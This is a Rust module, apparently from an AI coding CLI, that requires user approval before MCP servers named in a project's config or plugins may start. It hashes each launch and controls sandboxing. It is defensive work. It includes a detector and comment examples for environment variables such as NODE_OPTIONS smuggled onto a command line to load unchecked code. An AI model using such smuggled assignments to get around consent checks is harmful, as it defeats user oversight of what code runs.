//! Consent for the MCP servers a project's own `.mcp.json` or `mcp.json`
//! names, and for the servers of the plugins in its
//! `.agiworkforce/plugins`.
//!
//! Those files are repository content, and a sandboxed command can write
//! them, so naming a server there is discovery, not consent. A project server
//! starts only once the user has approved that exact launch for that folder:
//! the transport, command, arguments, environment variable names, the value of
//! every variable whose name does not mark a secret, whether it may reach
//! services on this computer, whether it runs outside the sandbox, and the
//! working folder, kept as a hash. Whether the server really starts in the
//! sandbox is decided once for a launch, from its entry and from every flag
//! and variable that overrides it, and that answer is what is hashed and
//! what the prompt says. An approval also pins the content of each file the
//! launch runs code from that a sandboxed command could write: its command,
//! the files named where the tool reads them as code, a launch folder's
//! manifests and entry, and a Python module's own files. That holds in the
//! sandbox too, which lets a server reach the internet and read the user's
//! files. A file the server is only pointed at is data and is not pinned.
//! Code edited there asks again before it runs. What those files import is
//! not followed, and the prompt says so. Any change asks again. The record
//! lives in
//! the CLI config root, beside the workspace trust registry, never in the
//! project.

use anyhow::{Context, Result};
use serde::Serialize;
use sha2::{Digest, Sha256};
use std::collections::{BTreeMap, HashMap};
use std::path::{Path, PathBuf};

use super::{McpServerConfig, McpTransport};
use agiworkforce_protocol::developer_session::{
    McpApprovalEnv, McpApprovalLaunch, McpApprovalNetwork, McpApprovalSandbox,
};
use agiworkforce_sandbox_policy::{pinned_value, shown_value};

const CONSENT_FILE: &str = "mcp-project-consent.json";
pub(crate) const PROJECT_CONFIG_FILES: [&str; 2] = [".mcp.json", "mcp.json"];

/// Approved launch hashes, by project folder and then server name.
type Store = BTreeMap<String, BTreeMap<String, String>>;

/// What the user approves. Secret environment values and every header value
/// stay out: they hold credentials, and rotating one is not a different
/// server. Every other value is pinned, since any of them can choose what
/// code the server loads.
#[derive(Serialize)]
#[serde(tag = "transport", rename_all = "lowercase")]
enum Launch<'a> {
    Stdio {
        command: &'a str,
        // The absolute program a bare command resolves to on the host PATH,
        // so the same name finding another program asks again. Left out for
        // a command that names its own path or resolves nowhere.
        #[serde(skip_serializing_if = "Option::is_none")]
        program: Option<String>,
        args: Vec<String>,
        env_keys: Vec<&'a str>,
        // Left out when empty, so a launch with no such value keeps the
        // approval it had before values were hashed.
        #[serde(skip_serializing_if = "BTreeMap::is_empty")]
        pinned_env: BTreeMap<&'a str, std::borrow::Cow<'a, str>>,
        cwd: &'a str,
        #[serde(skip_serializing_if = "std::ops::Not::not")]
        allow_local_network: bool,
        #[serde(skip_serializing_if = "std::ops::Not::not")]
        unsandboxed: bool,
        #[serde(skip_serializing_if = "Option::is_none")]
        start_in: Option<&'a str>,
        #[serde(skip_serializing_if = "BTreeMap::is_empty")]
        writable_files: BTreeMap<String, String>,
        // Set when a file the launch runs could not be pinned
        // ([`unpinned`]), to a value that is new at every start of the CLI.
        // An edit to such a file cannot be noticed, so an approval of the
        // launch must not outlive the run it was given in: recorded at one
        // start, it never matches at the next, and the user is asked again.
        #[serde(skip_serializing_if = "Option::is_none")]
        unpinned_in_run: Option<&'a str>,
    },
    Sse {
        url: String,
        header_keys: Vec<&'a str>,
    },
    Http {
        url: String,
        header_keys: Vec<&'a str>,
        auth: Option<PinnedOAuth>,
    },
}

/// What an approval pins of a remote server's sign-in settings. The fields
/// keep the order and names of [`super::McpOAuthConfig`], so an entry with
/// no client secret hashes as it did when that was hashed whole. The secret
/// itself is never hashed: only whether one is set.
#[derive(Serialize)]
struct PinnedOAuth {
    #[serde(skip_serializing_if = "Option::is_none")]
    authorize_url: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    token_url: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    scope: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    client_id: Option<String>,
    #[serde(skip_serializing_if = "std::ops::Not::not")]
    client_secret_set: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    redirect_uri: Option<String>,
}

impl PinnedOAuth {
    fn of(auth: &super::McpOAuthConfig) -> Self {
        let pinned = |url: &Option<String>| url.as_deref().map(|url| Forms::unnamed(url).pinned);
        Self {
            authorize_url: pinned(&auth.authorize_url),
            token_url: pinned(&auth.token_url),
            scope: auth.scope.clone(),
            client_id: auth.client_id.clone(),
            client_secret_set: auth.client_secret.is_some(),
            redirect_uri: pinned(&auth.redirect_uri),
        }
    }
}

/// What stands where a value is neither shown nor, when its name says it is
/// a credential, pinned.
const HIDDEN: &str = "(hidden)";

/// A name the sandbox-policy crate reads as an endpoint's, to reach its
/// reduction of a URL to where it points for a value no variable names: the
/// crate exports that reduction only through [`shown_value`].
const ENDPOINT_NAME: &str = "ARGUMENT_URL";

fn value_digest(hidden: &str) -> String {
    crate::hex::encode(&Sha256::digest(hidden.as_bytes()))
}

fn pinned_by_digest(hidden: &str) -> String {
    format!(
        "{}{}",
        agiworkforce_sandbox_policy::VALUE_DIGEST_PREFIX,
        value_digest(hidden)
    )
}

/// One value of a launch as an approval shows it and as it pins it. The two
/// differ only where the value is not shown, and there the value is pinned
/// by a digest. That holds for a value an option names a credential too,
/// unlike a variable named so: `--auth none` and `--key ed25519` are
/// switches, and an option's name is weaker evidence than a variable's, so
/// what follows it must not be free to change unasked. No credential is
/// shown, and the user, password and credential parameters of a URL are
/// never hashed.
#[derive(Debug, Clone, PartialEq, Eq)]
struct Forms {
    shown: String,
    pinned: String,
}

impl Forms {
    fn whole(value: &str) -> Self {
        Self {
            shown: value.to_string(),
            pinned: value.to_string(),
        }
    }

    /// A value an option or a variable names: what the name says decides, as
    /// it does for an environment variable.
    fn named(name: &str, value: &str) -> Self {
        match shown_value(name, value) {
            Some(shown) if shown == value => Self::unnamed(value),
            shown => Self {
                shown: shown.map_or_else(|| HIDDEN.to_string(), std::borrow::Cow::into_owned),
                pinned: pinned_value(name, value, value_digest)
                    .map_or_else(|| pinned_by_digest(value), std::borrow::Cow::into_owned),
            },
        }
    }

    /// A value nothing names: whole, unless it reads as a URL, which is
    /// shown and pinned as where it points, without the user, password,
    /// query and fragment a credential sits in.
    fn unnamed(value: &str) -> Self {
        if !value.contains("://") {
            return Self::whole(value);
        }
        Self {
            shown: shown_value(ENDPOINT_NAME, value)
                .map_or_else(|| HIDDEN.to_string(), std::borrow::Cow::into_owned),
            pinned: pinned_value(ENDPOINT_NAME, value, value_digest)
                .map_or_else(|| HIDDEN.to_string(), std::borrow::Cow::into_owned),
        }
    }

    fn after(self, prefix: &str) -> Self {
        Self {
            shown: format!("{prefix}{}", self.shown),
            pinned: format!("{prefix}{}", self.pinned),
        }
    }
}

/// The name an option gives the value that follows it, read as a variable's:
/// `--api-key` names `API_KEY`.
fn option_name(option: &str) -> String {
    option
        .trim_start_matches('-')
        .replace(['-', '.'], "_")
        .to_ascii_uppercase()
}

fn is_variable_name(name: &str) -> bool {
    name.starts_with(|first: char| first.is_ascii_alphabetic() || first == '_')
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Programs whose one-letter option takes a password as the next argument.
const PASSWORD_OPTIONS: [(&str, &str); 2] = [("sshpass", "-p"), ("redis-cli", "-a")];

/// Programs that take a password written straight after `-p`.
const ATTACHED_PASSWORD_PROGRAMS: [&str; 5] = [
    "mysql",
    "mariadb",
    "mysqldump",
    "mysqladmin",
    "mariadb-dump",
];

/// Each argument of a launch as an approval shows it and pins it.
///
/// An argument that follows an option is that option's value, and one
/// written `NAME=value` or `--name=value` carries its own name: such a value
/// is read by its name, so `--token`, `--api-key` and `--password` hide what
/// follows. Any argument that reads as a URL is reduced to where it points.
/// Everything else is shown and pinned whole.
fn argument_forms(command: &str, args: &[String]) -> Vec<Forms> {
    let program = Path::new(command)
        .file_name()
        .map(|name| name.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default();
    let mut forms = Vec::with_capacity(args.len());
    let mut named_by: Option<String> = None;
    for arg in args {
        let name = named_by.take();
        if !arg.starts_with('-') {
            forms.push(match (name, arg.split_once('=')) {
                (Some(name), _) if shown_value(&name, arg).is_none() => Forms::named(&name, arg),
                (_, Some((variable, value))) if is_variable_name(variable) => {
                    Forms::named(variable, value).after(&format!("{variable}="))
                }
                (Some(name), _) => Forms::named(&name, arg),
                (None, _) => Forms::unnamed(arg),
            });
            continue;
        }
        if ATTACHED_PASSWORD_PROGRAMS.contains(&program.as_str())
            && arg.starts_with("-p")
            && arg.len() > 2
        {
            forms.push(Forms {
                shown: format!("-p{HIDDEN}"),
                pinned: format!("-p{}", pinned_by_digest(&arg[2..])),
            });
            continue;
        }
        match arg.split_once('=') {
            Some((option, value)) => {
                forms.push(Forms::named(&option_name(option), value).after(&format!("{option}=")));
            }
            None => {
                named_by = Some(
                    if PASSWORD_OPTIONS.contains(&(program.as_str(), arg.as_str())) {
                        "PASSWORD".to_string()
                    } else {
                        option_name(arg)
                    },
                );
                forms.push(Forms::whole(arg));
            }
        }
    }
    forms
}

/// Whether the engine passes the variable `name` an entry sets on to the
/// server. One it does not pass is shown as such and pinned by nothing: the
/// approval covers what starts, and that variable is not part of it.
fn passed_to_server(name: &str) -> bool {
    agiworkforce_mcp::manifest_var_is_passed(name)
}

fn sorted_keys(map: &HashMap<String, String>) -> Vec<&str> {
    let mut keys: Vec<&str> = map.keys().map(String::as_str).collect();
    keys.sort_unstable();
    keys
}

/// The folder approvals for `project` are kept under: the project itself,
/// or for a linked git worktree the same folder in the checkout it was added
/// from, so a worktree of an approved project starts the servers that
/// project approved, as long as each launch is the same there.
fn project_key(project: &Path) -> String {
    let folder = project
        .canonicalize()
        .unwrap_or_else(|_| project.to_path_buf());
    origin_checkout_folder(&folder)
        .unwrap_or(folder)
        .to_string_lossy()
        .into_owned()
}

const GIT_LINK: &str = ".git";
const GIT_LINK_PREFIX: &str = "gitdir:";
const GIT_LINK_MAX_BYTES: u64 = 4096;

/// The first line of a small regular file. A `.git` link lives in the work
/// tree, where a sandboxed command can put anything: a pipe is not opened and
/// a large file is not read through.
fn first_line(path: &Path) -> Option<String> {
    use std::io::Read as _;
    if !std::fs::symlink_metadata(path).ok()?.is_file() {
        return None;
    }
    let mut text = String::new();
    std::fs::File::open(path)
        .ok()?
        .take(GIT_LINK_MAX_BYTES)
        .read_to_string(&mut text)
        .ok()?;
    text.lines().next().map(|line| line.trim().to_string())
}

/// Where `folder` sits in the checkout its linked git worktree was added
/// from, or `None` for a folder in no linked worktree.
///
/// The link is followed only when the repository agrees: the worktree's git
/// directory sits in that repository's own `worktrees` folder and names this
/// checkout back. A `.git` file is work-tree content a sandboxed command can
/// write, and without that check one pointing at another project's
/// repository would borrow that project's approvals.
fn origin_checkout_folder(folder: &Path) -> Option<PathBuf> {
    let top = folder
        .ancestors()
        .find(|dir| std::fs::symlink_metadata(dir.join(GIT_LINK)).is_ok())?;
    let link = top.join(GIT_LINK);
    let named = first_line(&link)?;
    let git_dir = top
        .join(named.strip_prefix(GIT_LINK_PREFIX)?.trim())
        .canonicalize()
        .ok()?;
    let common_dir = git_dir
        .join(first_line(&git_dir.join("commondir"))?)
        .canonicalize()
        .ok()?;
    let names_back = git_dir
        .join(first_line(&git_dir.join("gitdir"))?)
        .canonicalize()
        .ok()?;
    if git_dir.parent()? != common_dir.join("worktrees")
        || names_back != link.canonicalize().ok()?
        || common_dir.file_name()? != GIT_LINK
    {
        return None;
    }
    let origin = common_dir.parent()?;
    let inside = folder.strip_prefix(top).ok()?;
    Some(if inside.as_os_str().is_empty() {
        origin.to_path_buf()
    } else {
        origin.join(inside)
    })
}

/// How a project server will really start here. It is decided once for a
/// launch, from the server's entry and from everything that overrides it, and
/// the fingerprint, the prompt and the start all read the same answer.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Containment {
    /// Inside the OS sandbox.
    Sandboxed,
    /// Nowhere: it is to run in the sandbox, and the tool that makes one on
    /// this system is not installed, so the start is refused.
    Refused,
    /// Outside it because its entry sets `"sandbox": false`.
    OptedOut,
    /// Outside it because the sandbox is off for this run, whatever the
    /// entry says: `--no-sandbox`, or the variable that turns it off for
    /// MCP servers.
    TurnedOff,
    /// Outside it because this system has no sandbox at all.
    NoSandbox,
}

/// What this computer has to start a sandbox with.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SandboxTool {
    Installed,
    /// This system has one, and it is not installed: a sandboxed start fails.
    Missing,
    /// This system has none: a sandboxed start runs as configured.
    NotOnThisSystem,
}

impl Containment {
    pub(crate) fn of(config: &McpServerConfig) -> Self {
        let tool = if !matches!(
            crate::sandbox::SandboxType::detect(),
            crate::sandbox::SandboxType::None
        ) {
            SandboxTool::Installed
        } else if cfg!(any(target_os = "macos", target_os = "linux")) {
            SandboxTool::Missing
        } else {
            SandboxTool::NotOnThisSystem
        };
        Self::resolve(
            config,
            crate::sandbox::sandbox_settings(),
            crate::sandbox::sandbox_disabled(),
            tool,
        )
    }

    fn resolve(
        config: &McpServerConfig,
        settings: crate::sandbox::SandboxSettings,
        sandbox_disabled: bool,
        tool: SandboxTool,
    ) -> Self {
        if !matches!(config.as_transport(), McpTransport::Stdio { .. }) {
            return Self::Sandboxed;
        }
        if super::mcp_server_sandboxed(config, settings, sandbox_disabled) {
            return match tool {
                SandboxTool::Installed => Self::Sandboxed,
                SandboxTool::Missing => Self::Refused,
                SandboxTool::NotOnThisSystem => Self::NoSandbox,
            };
        }
        let mut kept = config.clone();
        keep_sandboxed(&mut kept);
        if super::mcp_server_sandboxed(&kept, settings, sandbox_disabled) {
            Self::OptedOut
        } else {
            Self::TurnedOff
        }
    }

    /// Whether the server runs with the user's own rights rather than the
    /// sandbox's.
    fn outside_sandbox(self) -> bool {
        matches!(self, Self::OptedOut | Self::TurnedOff | Self::NoSandbox)
    }
}

/// The files a `package.json` says the package starts from.
fn package_entries(manifest: &Path) -> Vec<String> {
    let Some(package) = std::fs::read(manifest)
        .ok()
        .and_then(|raw| serde_json::from_slice::<serde_json::Value>(&raw).ok())
    else {
        return Vec::new();
    };
    let mut entries: Vec<String> = package
        .get("main")
        .and_then(serde_json::Value::as_str)
        .map(str::to_string)
        .into_iter()
        .collect();
    match package.get("bin") {
        Some(serde_json::Value::String(bin)) => entries.push(bin.clone()),
        Some(serde_json::Value::Object(bins)) => entries.extend(
            bins.values()
                .filter_map(serde_json::Value::as_str)
                .map(str::to_string),
        ),
        _ => {}
    }
    entries
}

/// The content hash of each file the launch runs code from that a sandboxed
/// command could have written: one in `project`, a root a sandbox writes, or a
/// temporary folder. That is the command, each file named where the tool
/// reads it as code, and the ones a launch folder or a Python module implies;
/// a file the server is only pointed at, such as a database, is data and
/// stays out. A relative name counts only when the server starts in the
/// project. What those files import is not followed, and the prompt says so.
fn writable_launch_files(
    project: &Path,
    starts_in_project: bool,
    command: &str,
    args: &[String],
) -> BTreeMap<String, String> {
    agiworkforce_sandbox_policy::launch_files::pinned_launch_file_digests(
        project,
        starts_in_project,
        command,
        args,
        &package_entries,
        &|content: &[u8]| crate::hex::encode(&Sha256::digest(content)),
    )
}

/// What an approval of `config` pins by content, in the sandbox or out of
/// it. A sandboxed server is pinned too: its sandbox lets it reach the
/// internet and read the user's files, credential locations aside, which a
/// sandboxed shell command may not do without asking, so a command that
/// edits the server's code would otherwise borrow that reach the next time
/// the server starts. A
/// sandboxed server starts in the project whatever its entry says; one
/// outside the sandbox starts there only when [`super::starts_in_project`]
/// says so.
fn pinned_launch_files(
    project: &Path,
    config: &McpServerConfig,
    containment: Containment,
    command: &str,
    args: &[String],
) -> BTreeMap<String, String> {
    let mut pinned = writable_launch_files(
        project,
        !containment.outside_sandbox() || super::starts_in_project(config).unwrap_or(false),
        command,
        args,
    );
    for name in withheld_assignments(args) {
        pinned.insert(
            format!("{name}="),
            format!(
                "{}{SET_ON_THE_COMMAND_LINE}",
                agiworkforce_sandbox_policy::launch_files::UNPINNABLE_PREFIX
            ),
        );
    }
    pinned
}

const SET_ON_THE_COMMAND_LINE: &str =
    "it is set on the command line, where it reaches the server and loads code that cannot be checked";

/// The variables the engine never passes from a server's entry
/// ([`passed_to_server`]) that this command line sets all the same:
/// `env NODE_OPTIONS=… node x.js`, `sh -c "NODE_OPTIONS=… node x.js"`, or an
/// assignment behind any other wrapper. Withholding the entry's own variable
/// would mean nothing if the command line could hand the same one over, and
/// what such a variable loads is no file this approval pins. So the launch is
/// marked as one that cannot be checked and is asked at every start.
///
/// Every word of every argument is read, whatever stands before it: an
/// assignment that turns out to be data for some other program costs a
/// question, and one that is missed costs the check.
fn withheld_assignments(args: &[String]) -> Vec<String> {
    let mut names: Vec<String> = args
        .iter()
        .flat_map(|arg| {
            arg.split(|c: char| {
                c.is_whitespace() || matches!(c, ';' | '&' | '|' | '(' | ')' | '"' | '\'' | '`')
            })
        })
        .filter_map(|word| word.split_once('='))
        .map(|(name, _)| name)
        .filter(|name| is_variable_name(name) && !passed_to_server(name))
        .map(str::to_string)
        .collect();
    names.sort_unstable();
    names.dedup();
    names
}

/// The folder that keeps a server from running outside the sandbox: one its
/// launch runs code from that a sandboxed command can write and that holds
/// nothing an approval could pin, so approving it would approve whatever is
/// put there later.
#[cfg(test)]
fn contained_folder(project: &Path, config: &McpServerConfig) -> Option<String> {
    contained_folder_as(project, config, Containment::of(config))
}

fn contained_folder_as(
    project: &Path,
    config: &McpServerConfig,
    containment: Containment,
) -> Option<String> {
    let McpTransport::Stdio { command, args, .. } = config.as_transport() else {
        return None;
    };
    if !containment.outside_sandbox() {
        return None;
    }
    let roots = agiworkforce_sandbox_policy::host_path::untrusted_roots(&[project]);
    agiworkforce_sandbox_policy::launch_files::unpinnable_launch_folder(
        super::starts_in_project(config)
            .unwrap_or(false)
            .then_some(project),
        &command,
        &args,
        &roots,
        &package_entries,
    )
}

/// The folder a launch runs from and why no approval can cover it.
fn unpinnable(folder: &str) -> String {
    let folder = if folder == "." {
        "this project folder".to_string()
    } else {
        format!("the folder {folder}")
    };
    format!(
        "it runs from {folder}, which a sandboxed command can change and which holds no \
         package.json, pyproject.toml, uv.lock, Cargo.toml or entry file an approval could check"
    )
}

/// Why a server stays in the sandbox, and what would let it out.
fn contained_notice(folder: &str) -> String {
    format!(
        "it stays in the sandbox although its entry asks to leave it: {}. Name the file it \
         runs, or add one of those, to let it out",
        unpinnable(folder)
    )
}

/// Why a server is not started at all: nothing pins what it runs, and
/// nothing here can contain it.
fn uncontained_notice(folder: &str, containment: Containment) -> String {
    let (why, remedy) = match containment {
        Containment::NoSandbox => (
            "this system has no sandbox to contain it".to_string(),
            "Name the file it runs, or add one of those, to start it",
        ),
        Containment::Refused => (
            "the tool that would sandbox it is not installed on this computer".to_string(),
            "Install it, or name the file the server runs, to start it",
        ),
        Containment::Sandboxed | Containment::OptedOut | Containment::TurnedOff => (
            format!(
                "the sandbox that would contain it is turned off for this run (--no-sandbox \
                 or {}=0)",
                crate::sandbox::SANDBOX_MCP_ENV
            ),
            "Start without that, or name the file it runs, to start it",
        ),
    };
    format!(
        "it is not started: {}, and {why}. {remedy}",
        unpinnable(folder)
    )
}

/// The files among `pinned` whose content could not be pinned, each with
/// the reason: too large, not a regular file, changed while it was read, or
/// past the number a launch may name.
fn unpinned(pinned: &BTreeMap<String, String>) -> Vec<(&str, &str)> {
    pinned
        .iter()
        .filter_map(|(label, value)| {
            let reason = agiworkforce_sandbox_policy::launch_files::unpinnable_reason(value)?;
            Some((label.as_str(), reason))
        })
        .collect()
}

/// What stands for this run of the CLI in the hash of a launch that has a
/// file nothing could pin. See `Launch::Stdio::unpinned_in_run`.
fn this_run() -> &'static str {
    static RUN: std::sync::OnceLock<String> = std::sync::OnceLock::new();
    RUN.get_or_init(|| uuid::Uuid::new_v4().to_string())
}

/// What the user is told about the code a project server runs: which files
/// ask again when they change, that the rest do not, and which of the files
/// that should have been checked could not be.
fn code_risk(pinned: &BTreeMap<String, String>, containment: Containment) -> String {
    let unchecked = unpinned(pinned);
    let checked: Vec<&str> = pinned
        .keys()
        .map(String::as_str)
        .filter(|label| !unchecked.iter().any(|(left_out, _)| left_out == label))
        .collect();
    let mut rechecked = if checked.is_empty() {
        "none of the files it loads is checked again".to_string()
    } else {
        format!(
            "a change to {} asks you again, but no other file it loads is checked again",
            checked.join(", ")
        )
    };
    if !unchecked.is_empty() {
        let listed: Vec<String> = unchecked
            .iter()
            .map(|(label, reason)| format!("{label} ({reason})"))
            .collect();
        rechecked.push_str(&format!(
            ". {} could not be checked at all, so an approval lasts only until the CLI \
             stops and you are asked again every time it starts",
            listed.join(", ")
        ));
    }
    if containment.outside_sandbox() {
        format!(
            "It runs code from this project outside the sandbox: {rechecked}, so an edit to \
             one of those runs with your rights the next time it starts"
        )
    } else {
        format!(
            "It runs code from this project: {rechecked}, so an edit to one of those runs \
             with that reach the next time it starts"
        )
    }
}

/// What the user is asked to approve for a local server: the command, where
/// and with what rights it really starts, and what an approval leaves
/// unchecked.
fn launch_description(
    project: &Path,
    config: &McpServerConfig,
    containment: Containment,
) -> String {
    let McpTransport::Stdio {
        command,
        args,
        allow_local_network,
        ..
    } = config.as_transport()
    else {
        return String::new();
    };
    let code_risk = code_risk(
        &pinned_launch_files(project, config, containment, &command, &args),
        containment,
    );
    let folder = contained_folder_as(project, config, containment);
    let shown_args = argument_forms(&command, &args)
        .into_iter()
        .map(|argument| argument.shown);
    let mut launch = crate::sandbox::shell_join(
        &std::iter::once(command)
            .chain(shown_args)
            .collect::<Vec<_>>(),
    );
    let rights = "with your full user rights: it can read, change and delete any file you can";
    let reach = "it can change files only in this project and cannot read your keys, cloud \
                 logins, keychains or this app's own data, but it can reach the internet and \
                 read every other file your account can. If it needs one of those, such as \
                 git over ssh, it has to run outside the sandbox, which asks you again";
    let started = if super::starts_in_project(config).unwrap_or(false) {
        "started in this project folder"
    } else {
        "started in the CLI's own config folder, not in this project"
    };
    launch.push_str(&match (containment, folder) {
        (Containment::Sandboxed, _) => {
            format!(" (in the sandbox, started in this project folder: {reach}. {code_risk})")
        }
        (Containment::Refused, _) => format!(
            " (it will not start on this computer yet: it runs only in the sandbox, and the \
             tool that makes one is not installed. Once it is, the server starts in this \
             project folder: {reach}. {code_risk})"
        ),
        (Containment::OptedOut, Some(folder)) => format!(
            " (started in this project folder; {})",
            contained_notice(&folder)
        ),
        (Containment::OptedOut, None) => format!(
            " (outside the sandbox, {started}, {rights}. {code_risk}. Remove \"sandbox\": \
             false from its entry to contain it)"
        ),
        (Containment::TurnedOff, _) => format!(
            " (outside the sandbox, which is turned off for this run by --no-sandbox or \
             {}=0, {started}, {rights}. {code_risk}. Start without that to contain it)",
            crate::sandbox::SANDBOX_MCP_ENV
        ),
        (Containment::NoSandbox, _) => format!(
            " (without a sandbox, which this system does not have, {started}, {rights}. \
             {code_risk})"
        ),
    });
    if allow_local_network {
        launch.push_str(" (it can reach services on this computer, such as databases and Docker)");
    }
    launch
}

/// One line for each approved server this start keeps in the sandbox
/// against its entry, or does not start at all, so the reason is on screen
/// every time and not only when the launch was first approved.
fn contained_lines(
    store: &Store,
    project: &Path,
    servers: &[(ProjectSource, String, McpServerConfig)],
    resolve: &dyn Fn(&McpServerConfig) -> Containment,
) -> Vec<String> {
    servers
        .iter()
        .filter_map(|(source, name, config)| {
            let containment = resolve(config);
            if !consented_as(store, project, *source, name, config, containment) {
                return None;
            }
            let folder = contained_folder_as(project, config, containment)?;
            let notice = match kept_in_sandbox(config, containment, resolve) {
                Ok(_) => contained_notice(&folder),
                Err(left_as) => uncontained_notice(&folder, left_as),
            };
            Some(format!(
                "MCP: server '{}': {}.",
                crate::terminal_text::sanitize_terminal_text(name),
                crate::terminal_text::sanitize_terminal_text(&notice)
            ))
        })
        .collect()
}

/// An approved launch that nothing pins, as it may still start: the same
/// entry kept in the sandbox, when its own opt-out is all that let it out and
/// a sandbox is there to hold it. Otherwise how it would start, which is why
/// it does not.
fn kept_in_sandbox(
    config: &McpServerConfig,
    containment: Containment,
    resolve: &dyn Fn(&McpServerConfig) -> Containment,
) -> Result<McpServerConfig, Containment> {
    if containment != Containment::OptedOut {
        return Err(containment);
    }
    let mut kept = config.clone();
    keep_sandboxed(&mut kept);
    match resolve(&kept) {
        Containment::Sandboxed => Ok(kept),
        left_as => Err(left_as),
    }
}

fn keep_sandboxed(config: &mut McpServerConfig) {
    match config {
        McpServerConfig::Legacy(legacy) => legacy.sandbox = Some(true),
        McpServerConfig::Tagged(McpTransport::Stdio { sandbox, .. }) => *sandbox = Some(true),
        McpServerConfig::Tagged(McpTransport::Sse { .. } | McpTransport::Http { .. }) => {}
    }
}

/// The hash of one server's launch from `project`. Whether it really starts
/// in the sandbox is part of it: an approval given to a sandboxed launch does
/// not cover the same command once a flag or the environment lets it out.
fn fingerprint_as(project: &Path, config: &McpServerConfig, containment: Containment) -> String {
    fingerprint_in_run(project, config, containment, this_run())
}

/// [`fingerprint_as`] for the run of the CLI that `run` stands for.
fn fingerprint_in_run(
    project: &Path,
    config: &McpServerConfig,
    containment: Containment,
    run: &str,
) -> String {
    let transport = config.as_transport();
    let cwd = project_key(project);
    let launch = match &transport {
        McpTransport::Stdio {
            command,
            args,
            env,
            allow_local_network,
            cwd: start_in,
            ..
        } => {
            let writable_files = pinned_launch_files(project, config, containment, command, args);
            let unpinned_in_run = (!unpinned(&writable_files).is_empty()).then_some(run);
            Launch::Stdio {
                command,
                program: super::resolved_program(command),
                args: argument_forms(command, args)
                    .into_iter()
                    .map(|argument| argument.pinned)
                    .collect(),
                env_keys: sorted_keys(env)
                    .into_iter()
                    .filter(|name| passed_to_server(name))
                    .collect(),
                pinned_env: env
                    .iter()
                    .filter(|(name, _)| passed_to_server(name))
                    .filter_map(|(name, value)| {
                        let pinned = pinned_value(name, value, |hidden| {
                            crate::hex::encode(&Sha256::digest(hidden.as_bytes()))
                        })?;
                        Some((name.as_str(), pinned))
                    })
                    .collect(),
                cwd: &cwd,
                allow_local_network: *allow_local_network,
                unsandboxed: containment.outside_sandbox(),
                start_in: start_in.as_deref(),
                writable_files,
                unpinned_in_run,
            }
        }
        McpTransport::Sse { url, headers } => Launch::Sse {
            url: Forms::unnamed(url).pinned,
            header_keys: sorted_keys(headers),
        },
        McpTransport::Http { url, headers, auth } => Launch::Http {
            url: Forms::unnamed(url).pinned,
            header_keys: sorted_keys(headers),
            auth: auth.as_ref().map(PinnedOAuth::of),
        },
    };
    let encoded = serde_json::to_vec(&launch).unwrap_or_default();
    crate::hex::encode(&Sha256::digest(&encoded))
}

fn store_path() -> Result<PathBuf> {
    Ok(crate::config::CliConfig::config_dir()?.join(CONSENT_FILE))
}

fn load_store(path: &Path) -> Store {
    std::fs::read(path)
        .ok()
        .and_then(|raw| serde_json::from_slice(&raw).ok())
        .unwrap_or_default()
}

fn save_store(path: &Path, store: &Store) -> Result<()> {
    let staging = path.with_extension("json.tmp");
    std::fs::write(&staging, serde_json::to_vec_pretty(store)?)
        .with_context(|| format!("write {}", staging.display()))?;
    std::fs::rename(&staging, path).with_context(|| format!("write {}", path.display()))
}

/// Which of a project's files names a server. Each keeps its approvals
/// apart, so a plugin's server and an MCP file's server of the same name
/// never share one.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ProjectSource {
    McpFile,
    Plugin,
}

impl ProjectSource {
    fn store_key(self, name: &str) -> String {
        match self {
            Self::McpFile => name.to_string(),
            Self::Plugin => format!("plugin:{name}"),
        }
    }

    fn describe(self) -> &'static str {
        match self {
            Self::McpFile => "This project's MCP file",
            Self::Plugin => "A plugin in this project's .agiworkforce/plugins",
        }
    }
}

fn consented_in(
    store: &Store,
    project: &Path,
    source: ProjectSource,
    name: &str,
    config: &McpServerConfig,
) -> bool {
    consented_as(
        store,
        project,
        source,
        name,
        config,
        Containment::of(config),
    )
}

fn consented_as(
    store: &Store,
    project: &Path,
    source: ProjectSource,
    name: &str,
    config: &McpServerConfig,
    containment: Containment,
) -> bool {
    store
        .get(&project_key(project))
        .and_then(|servers| servers.get(&source.store_key(name)))
        .is_some_and(|stored| *stored == fingerprint_as(project, config, containment))
}

#[cfg(test)]
fn record_in(
    store: &mut Store,
    project: &Path,
    source: ProjectSource,
    name: &str,
    config: &McpServerConfig,
) {
    record_as(
        store,
        project,
        source,
        name,
        config,
        Containment::of(config),
    );
}

#[cfg(test)]
fn record_as(
    store: &mut Store,
    project: &Path,
    source: ProjectSource,
    name: &str,
    config: &McpServerConfig,
    containment: Containment,
) {
    record_fingerprint(
        store,
        project,
        source,
        name,
        fingerprint_as(project, config, containment),
    );
}

/// Record an approval of the launch that hashed to `fingerprint`. An
/// approval is always of a hash that was taken before the user was asked and
/// compared after the answer, never of one taken while recording: the files
/// could have changed in between, and nobody was shown that launch.
fn record_fingerprint(
    store: &mut Store,
    project: &Path,
    source: ProjectSource,
    name: &str,
    fingerprint: String,
) {
    store
        .entry(project_key(project))
        .or_default()
        .insert(source.store_key(name), fingerprint);
}

/// A project server a load left out, and why.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Withheld {
    pub name: String,
    pub reason: WithheldReason,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum WithheldReason {
    /// The user has not approved this exact launch for this project.
    NeedsApproval,
    /// Approved, but it would run code nothing pins with nothing to contain
    /// it. The text says which folder and what turned the sandbox off.
    Uncontained(String),
}

/// Remove every server in `servers` that may not start for `project`, and
/// return them with the reason, sorted by name.
pub fn retain_consented(
    project: &Path,
    servers: &mut HashMap<String, McpServerConfig>,
) -> Vec<Withheld> {
    let store = store_path()
        .map(|path| load_store(&path))
        .unwrap_or_default();
    retain_as(
        &store,
        project,
        ProjectSource::McpFile,
        servers,
        &Containment::of,
    )
}

/// [`retain_consented`] for the servers of the project's own plugins.
pub(crate) fn retain_consented_plugin_servers(
    project: &Path,
    servers: &mut HashMap<String, McpServerConfig>,
) -> Vec<Withheld> {
    let store = store_path()
        .map(|path| load_store(&path))
